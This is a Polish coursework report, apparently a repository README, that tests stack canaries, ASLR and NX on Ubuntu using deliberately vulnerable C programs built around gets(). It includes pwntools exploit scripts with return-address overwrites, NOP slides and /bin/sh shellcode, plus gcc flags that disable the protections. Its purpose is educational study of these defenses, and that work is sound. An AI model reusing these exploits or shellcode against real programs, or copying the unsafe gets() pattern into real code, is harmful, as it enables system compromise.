# Badanie rozwiązań chroniących natywne aplikacje działające w trybie użytkownika

## Wstęp
Celem pracy jest zbadanie wybranych rozwiązań chroniących natywne aplikacje działające w trybie użytkownika. W celu przeprowadzenia wszelkich praktycznych części każdego z zagadnień używany był przeze mnie system Ubuntu 20.04.2.0 w wersji 64-bitowej. Innymi użytymi narzędziami był Python 3.8.5, kompilator gcc w wersji 9.3.0, oraz debugger GNU gdb w wersji 9.2.

### Przepełnienie bufora
Wszystkie rozwiązania badane przeze mnie w poniższej pracy mają na celu ochronę użytkownika przed atakami typu _Buffer Overflow_. Z tego też względu na początku postanowiłem lepiej przybliżyć koncepcje tego typu ataków.  

W tej pracy skupiam się na przepełnieniu bufora na stosie. Jest ono możliwe, ze względu na zastosowanie niebezpiecznych funkcji w różnych językach programowania. Tymi językami są najczęściej _C_/_C++_, ponieważ nie posiadają one wbudowanych zabezpieczeń przed nadpisaniem, bądź dostępem do danych w pamięci. Rozważania prowadzone dalej prowadzone są dla użycia języka _C_. Wyzej wspomniane funkcje pozwalają użytkownikowi na wpisanie danych do pamięci, poza wyznaczony obszar. Jest to możliwe ponieważ nie dokonują one poprawnej weryfikacji wprowadzonych danych. W takiej sytuacji użytkownik może wprowadzić dane o większej długości, niż przeznaczony na to bufor. Nadmiarowa długość wejścia nadpisze pamięć poza buforem.  

Niebezpieczeństwo opisanej powyżej sytuacji wynika z tego, że bufor w pamięci znajduje się na stosie wywołania danej fukncji (rozpatruję przypadek bufora na stosie). Stos jest strukturą przechowującą nie tylko bufor, ale i inne dane związane z wywołaniem funkcji. To takich danych należą m.in. zmienne lokalne, oraz wskaźniki. Kluczowym w prowadzonych rozważaniach wskaźnikiem będzie _return pointer_ (wskaźnik na adres powrotu). Nadpisanie zawartości pamięci pod adresem takiego wskaźnika (który znajduje się pod buforem), w teorii może pozwolić atakującemu na wskazanie procesorowi dowolnego miejsca w pamięci, jako dalszej części programu i zmusić go do wykonania znajdujących się w tym obszarze instrukcji. Jednym ze sposobów na to, aby napastnik mógł wykonać napisane przez siebie samego instrukcje, jest np. umieszczenie ich w przepełnianym buforze i wskazanie ich lokalizacji jako adres powrotu funkcji. Celem atakującego może być również przykładowo nadpisanie zmiennych lokalnych funkcji na stosie (np. aby zaburzyć integralność danych dla danego wykonania programu).  

W praktyce, w nowoczesnych systemach komputerowych, nie jest to takie trywialne. Dzisiejsze kompilatory czy same systemy operacyjne dostarczają często wiele warstw rozwiązań, mających na celu zabezpieczyć aplikacje przed możliwością wykonania takiego ataku. W poniższej pracy omówię trzy, często stosowane, przykłady takich rozwiązań.  

Dla omówienia poszczególnych rozwiązań skupię się na ataku przez nadpisanie adresu powrotu ramki stosu.

## Kanarki stosu
### Zakres działania

Kanarek stosu jest specjalną wartością umieszczoną na stosie w odpowiednim miejscu, w taki sposób aby chronić dane stosu przed nadpisaniem od strony bufora. Można go skategoryzować jako zabezpieczenie służące do wykrycia próby przepełnienia buforu na stosie. Jest on dodawany automatycznie przez nowoczesne kompilatory, podczas procesu kompilacji kodu programu (pod warunkiem że taka opcja nie zostanie wyłączona). Dąży się do tego, aby miał on unikalną wartość, która będzie sprawdzana, gdy program powraca do funkcji wywołującej. W przypadku kiedy dojdzie do przepełnienia bufra na stosie i nadpisania kluczowych dla atakującego danych na stosie (np. wspomniany wcześniej adres powrotu), wtedy nieuniknionym powinno być nadpisanie przez atakującego wartości kanarka. Będzie to skutkowało blędną weryfikacją przed samym powrotem funkcji, co spowoduje przerwanie działania programu. Zapobiegnie to przejściu procesora do wykonywania instrukcji wskazanych przez atakującego.  


<p align="center">
  <img src="obrazy/kanarek_1.png" />
</p>
<p align = "center">
  Rys. 1 - Schematyczne przedstawienie możliwej struktury ramki stosu z uwzględnieniem kanarka stosu.
</p>  
  

<p align="center">
  <img src="obrazy/kanarek_2.png" />
</p>
<p align = "center">
  Rys. 2 - Część wygenerowanego przez kompilator gcc kodu Assemblera dla włączonych, i dla wyłączonych kanarków stosu.
</p>

#### Typy kanarków stosu

Można wyróżnić różne typy kanarków. Są nimi między innymi:
- _**Null canary**_ - Najprostszy typ kanarka. Dla systemu 32-bitowego składa się z czterech bajtów _NULL_ pod rząd. Jego wartość jest przewidywalna dla atakującego, więc tego typu kanarek ma na celu ochronę przed przepełnieniami bufora za pomocą funkcji operujących na stringach.
- _**Terminator canary**_ - Zbliżony w koncepcji działania do _Null canary_. Zawiera on bajty: _0x00, 0x0d, 0x0a, 0xff_. Powinny one przerwać ciąg znaków dla większości operacji operujących na stringach.
- _**Random canary**_ - Losowy kanarek stosu. Jego trzy pseudolosowe bajty mogą być poprzedzone _NULL_-bajtem (0x00).
- _**Random XOR canary**_ - _Random canary_, którego wartość może być dodatkowo _XOR_-owana np. z wartościami wskaźników. Dodaje to dodatkową warstwę bezpieczeństwa przy próbie podmienienia wartości kanarka i nadpisania jakiegoś wskaźnika przez napastnika.

### Przykładowa aplikacja
Poniższa aplikacja została napisana w języku _C_. Jest to prosta aplikacja pobierająca dane tekstowe od użytkownika (jego imię). Ze względu na to, że przedmiotem badań tego punktu są kanarki stosu - postanowiłem w celach demonstracyjnych umieścić w aplikacji kawałek kodu, który wprost podaje użytkownikowi adres stosu funkcji _main_.

```C
#include <stdio.h>
#include <stdlib.h>

void get_users_name()
{
    char name[64] = {0};
    puts("Podaj imie:");
    gets(name);
    printf("Czesc %s!\n", name);
}

int main()
{
    int x;
    printf("Adres na stosie main: %p\n", &x);
    get_users_name();
    return 0;
}
```

Aplikacja ta, w celu przyjęcia danych od użytkownika używa niebezpiecznej funkcji _gets()_, która została już usunięta ze standardu języka _C_. 
Plik _main.c_ zawierający powyższy kod został dołączony do repozytorium i znajduje się w katalogu _Kanarki_.

### Exploit

Poniższy exploit pobiera od aplikacji adres z ramki stosu _main_, następnie na podstawie pobranego adresu, oraz _shellcode_'u tworzy ładunek. Ładunek został skonstruowany w taki sposób, aby wykonywalny _shellcode_ umieścić w ramce stosu _main_, tak aby wskazany adres powrotu doprowadził do wykonania _shellcode_'u (dzięki wykorzystaniu _NOP Slide_).

```Python
from pwn import *

#uruchamia proces main i zczytuje adres stosu:
p = process("./main")
p.readuntil("Adres na stosie main: ")
stack_ptr = int(p.readuntil("\n").strip(), 16)
p.readuntil("Podaj imie:\n")

#przygotowanie ciagu bajtow do przepelnienia bufora
padding = b'\x90'*72
RIP = p64(stack_ptr)
NOP = b'\x90'*128
shellcode =b'\xeb\x1e\x5f\x48\x31\xc0\x88\x47\x07\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x48\x31\xc9\x0f\x05\x48\x31\xc0\x48\x31\xff\xb0\x3c\x0f\x05\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x70\xd8\xff\xff\xff\x7f'
payload =  padding + RIP + NOP + shellcode

#debugger
gdb.attach(p)

#wyslanie ladunku
p.sendline(payload)
print(p.readall())
```

Plik _exploit.py_ zawierający powyższy kod został dołączony do repozytorium i znajduje się w katalogu _Kanarki_.

#### Działanie exploit'a dla wersji programu bez włączonego zabezpieczenia, oraz z włączonym zabezpieczeniem


Poniżej okno debuggera dla uruchomienia exploit'a komendą ```python3 exploit.py``` z wyłączonymi kanarkami stosu (komenda użyta do kompilacji pliku main.c: ```gcc main.c -std=c99 -fno-stack-protector -z execstack -no-pie -w -o main -Wl,-z,norelro```):

<p align="center">
  <img src="obrazy/exploit_bez_kanarkow.png" />
</p>
<p align = "center">
  Rys. 3 - Jak widać wykonanie shellcode'u powiodło się.
</p>  


Okno debuggera dla uruchomienia exploit'a komendą ```python3 exploit.py``` z włączonymi kanarkami stosu (komenda użyta do kompilacji pliku main.c: ```gcc main.c -std=c99 -z execstack -no-pie -w -o main -Wl,-z,norelro```):

<p align="center">
  <img src="obrazy/exploit_z_kanarkami.png" />
</p>
<p align = "center">
  Rys. 4 - W tej sytuacji wykonanie programu zostało zatrzymane zgodnie z oczekiwaniami.
</p>  

### Porównanie metody dla kompilatorów gcc oraz clang
Przedstawiana w tym punkcie metoda działa w podobny sposób w przypadku najnowszych wersji obu tych kompilatorów.

### Użyteczność metody oraz wady jej stosowania
Kanarki stosu są jedną z podstawowych metod zabezpieczenia przed atakami typu _buffer overflow_. Mimo wprowadzanych ulepszeń jak np. w kwestii randomizacji wartości kanarka, mogą się one okazać możliwe do przewidzenia, więc nigdy nie stanowią pełnego zabezpieczenia. Wymuszają one dla procesora dodatkowe instrukcje, wydłużając czas wykonania programu.

## ASLR

### Zakres działania
_ASLR_ czyli _Address Space Layout Randomization_ jest techniką zapobiegającą możliwej eksploitacji programu poprzez naruszenia jego pamięci. Mechanim taki, w przeciwieństwie do wcześniej omaiwanych kanarków stosu, nie jest dodawany w jakiś sposób przez kompilator, a za jego działanie odpowiada sam system operacyjny. Jego działanie opiera się na losowaniu zestawu kluczowych adresów (takich jak miejsca stosu, sterty, czy bilbliotek). To w jaki dokładnie sposób się to odbywa, zależy od implementacji mechanizmu w danym systemie operacyjnym. W najlepszym przypadku istotne adresy powinny być losowe przy każdym wywołaniu ramki stosu. Powinno się także zadbać o zmianę przesunięcia kluczowych dla wykonania programu struktur o inną, losową wartość, przy każdym uruchomieniu programu.

### Przykładowa aplikacja
Poniższa aplikacja, napisana w języku _C_, została zbudowana na bazie aplikacji z porzedniego punktu. W poprzednim punkcie udało się wywołać instrukcje _shellcode_’u mino włączonego _ASLR_, ponieważ program podawał za każdym razem nowy, wylosowany adres stosu _main_. W tym punkcie aplikacja nie podaje takiego adresu. Zakładam, że atakujący zdobył ten adres w inny sposób, a przez brak włączonego _ASLR_ adres taki może zostać umieszczony na stałe w exploicie (który jest pokazany w kolejnym punkcie).

```C
#include <stdio.h>
#include <stdlib.h>

void get_users_name()
{
    char name[64] = {0};
    puts("Podaj imie:");
    gets(name);
    printf("Czesc %s!\n", name);
}

int main()
{
    get_users_name();
    return 0;
}
```

Plik _main.c_ zawierający powyższy kod został dołączony do repozytorium i znajduje się w katalogu _ASLR_.

### Exploit

Poniższy exploit działa na zasadzie podobnej do poprzedniego, jednak tym razem nie zczytuje od adresu ramki stosu main od programu przy każdym wykonaniu, tylko ma na stałe ustalony adres tej ramki.

```Python
from pwn import *

p = process("./main")
p.readuntil("Podaj imie:\n")

padding = b'\x90'*72
RIP = p64(0x7fffffffdefc) #ustalony na stale adres stosu main
NOP = b'\x90'*128
shellcode =b'\xeb\x1e\x5f\x48\x31\xc0\x88\x47\x07\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x48\x31\xc9\x0f\x05\x48\x31\xc0\x48\x31\xff\xb0\x3c\x0f\x05\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x70\xd8\xff\xff\xff\x7f'
payload =  padding + RIP + NOP + shellcode

gdb.attach(p)

p.sendline(payload)
print(p.readall())
```

Plik _exploit.py_ zawierający powyższy kod został dołączony do repozytorium i znajduje się w katalogu _ASLR_.

#### Działanie exploit'a dla wersji programu bez włączonego zabezpieczenia oraz z włączonym zabezpieczeniem

Najpierw działanie exploit'a dla systemu Linux, po wykonaniu w terminalu polecenia dezaktywującego mechanizm ASLR. Kompilacja samego programu odbyła się przy użyciu komendy: ```gcc main.c -std=c99 -fno-stack-protector -z execstack -no-pie -w -o main -Wl,-z,norelro```:

<p align="center">
  <img src="obrazy/exploit_bez_aslr.png" />
</p>
<p align = "center">
  Rys. 5 - Działanie exploit'a z wyłączonym ASLR - wykonanie shellcode’u powiodło się.
</p>  

Następnie sprawdziłem czy exploit zadziała dla programu skompilowanego w porzedniej sytuacji, jednak z włączonym ASLR.

<p align="center">
  <img src="obrazy/exploit_z_aslr.png" />
</p>
<p align = "center">
  Rys. 6 - Działanie exploit'a z włączonym ASLR - wykonanie shellcode’u nie powiodło się.
</p>  

### Porównanie działania ASLR dla systemów z rodziny Windows oraz Linux

Platformy _Windows_, oraz _Linux_ zapewniają _ASLR_ w odmienny sposób. Główna róznica jest taka, że _ASLR_ dla systemu _Windows 10_ jest dokonywany podczas ładowania programu i nie wpływa to na wydajność programu podczas jego działania. W systemach z rodziny _Linux_ operacje związane z _ASLR_ są dokonywane w trakcie działania programu, co ma wpływ na wydajność programu. W zamian za to w systemie _Linux_ wykorzystanie pamięci przez program może być lepiej zorganizowane.

### Użyteczność metody oraz wady jej stosowania

Opisana powyżej metoda może znacznie utrudnić atakującemu ataki typu _ROP_ (_return-oriented programming_). Mimo tego że technika jest często możliwa do obejścia, to warto ją strosować, w szczególności w połączeniu z innymi technikami (jak np. opisany w kolejnym punkcie niewykonywalny stos). Niestety, w zależności od implementacji, ma ona wpływ na wydajność, bądź wykorzystanie pamięci programu.

## Execution Disable / NX / W + X

### Zakres działania

Omawiana w tym punkcie metoda ma na celu spowodowanie, aby wskazane segmenty pamięci nie mogły być zapisywane i wykonywane w tym samym momencie. Jest wspierana przez większość współczesnych procesorów. System może oznaczyć pewne obszary pamięci jako wykonywalne, lub niewykonywalne. Dokładny sposób działania może się różnić, w zależności od wykorzystywanego systemu czy sprzętu, jednak koncepcyjnie wszystkie rozwiązania dążą do tego samego - wspomnianego wyżej zablokowania możliwości pisania, oraz wykonywania zawartości określonych obszarów pamięci jednocześnie. Dla rozpa- trywanego w tej pracy _buffer overflow_ - metoda ta nie blokuje przepełnienia bufora, jednak zapobiega wykonaniu wrzuconego na stos kodu _shellcode_.

### Przykładowa aplikacja

Na poziome aplikacji nie ma różnicy w kodzie aplikacji pomiędzy tym punktem a poprzednim. Dla przypomnienia kod programu wygląda następująco:
```C
#include <stdio.h>
#include <stdlib.h>

void get_users_name()
{
    char name[64] = {0};
    puts("Podaj imie:");
    gets(name);
    printf("Czesc %s!\n", name);
}

int main()
{
    get_users_name();
    return 0;
}
```

Plik _main.c_ zawierający powyższy kod został dołączony do repozytorium i znajduje się w katalogu _Execution Disable_.

### Exploit

Ogólna zasada działania _exploit_'a w tej wersji nie zmieniła się szczególnie, jednak tym razem zmienia się konstrukcja ładunku. Zamiast całego _shellcode_’u, umieszczona jest instrukcja _0xCC_, która ma za zadanie zatrzymanie debuggera.

```Python 
from pwn import *

p = process("./main")
p.readuntil("Podaj imie:\n")

padding = b'\x90'*72
RIP = p64(0x7fffffffdefc)
NOP = b'\x90'*128
trap = b'\xCC'
payload =  padding + RIP + NOP + trap

gdb.attach(p)

p.sendline(payload)
print(p.readall())
```

Plik _exploit.py_ zawierający powyższy kod został dołączony do repozytorium i znajduje się w katalogu _Execution Disable_.

#### Działanie exploit'a dla wersji programu bez włączonego zabezpieczenia oraz z włączonym zabezpieczeniem

W celu pokazania działania zabezpieczenia, chce zobrazować sytuację w której stos zostaje przepełniony, jednak umieszczone na stosie instrukcje nie wykonują się, a działanie programu zostaje przerwane.  

Najpierw w wersji dla wyłączonego zabezpieczenia. Kompilacja kodu programu komendą: ```gcc main.c -std=c99 -fno-stack-protector -z execstack -no-pie -w -o main -Wl,-z,norelro```.

<p align="center">
  <img src="obrazy/gdb4_1.png" />
</p>
<p align = "center">
  Rys. 7 - SIGTRAP - ustawiona na stosie instrukcja została wykonana.
</p>  

Teraz dla włączonego zabezpieczenia. Kompilacja kodu programu komendą: ```gcc main.c -std=c99 -fno-stack-protector -no-pie -w -o main -Wl,-z,norelro```.

<p align="center">
  <img src="obrazy/gdb4_2.png" />
</p>
<p align = "center">
  Rys. 8 - SIGSEGV - ustawiona na stosie instrukcja nie została wykonana.
</p> 

Jak widać pamięć stosu _main_ w obu przypadkach wygląda tak samo (więc w obu przypadkach doszło do przepełnienia bufora). Jednak tylko w przypadku bez zabezpieczenia, instrukcja umieszczona na stosie została wykonana i kompilator otrzymał _SIGTRAP_.

### Użyteczność metody oraz wady jej stosowania

Powyższa metoda jest skuteczna jeśli chodzi o zapobieganie wykonywania instrukcji na stosie funkcji. Możliwym dla atakującego obejściem jest np. zastosowanie ataku typu _return-to-libc_. Z tego właśnie względu metoda ta szczególnie dobrze sprawdzi się z jednoczesnym użyciem innych metod np. _ASLR_.
